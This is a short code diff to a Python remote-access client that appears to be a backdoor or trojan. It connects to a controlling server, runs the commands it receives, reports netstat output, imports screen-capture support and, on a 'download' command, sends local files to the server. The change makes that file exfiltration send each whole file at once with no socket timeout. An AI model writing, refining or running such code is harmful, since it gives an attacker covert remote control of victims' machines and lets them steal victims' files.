@@ -4,6 +4,7 @@ import subprocess
 import struct
 import base64
 import io
+import time
 import re
 from PIL import ImageGrab
 
@@ -59,14 +60,12 @@ class Client:
             self.executeAndSend(command)
 
         if data.startswith(b"download"):
-            print(data)
             file = data[8:].decode()
+            self.server_socket.settimeout(None)
             with open(file, 'rb') as f:
-                # send the file contents in chunks
-                chunk = f.read(1024)
-                while chunk:
-                    self.server_socket.sendall(chunk)
-                    chunk = f.read(1024)
+                data = f.read()
+                self.server_socket.sendall(data)
+
 
         if data.startswith(b"netstat"):
             self.executeAndSend('netstat -nat')
@@ -124,5 +123,4 @@ class Client:
         self.makeConnection()
         while True:
             self.listenForCommands()
-
 
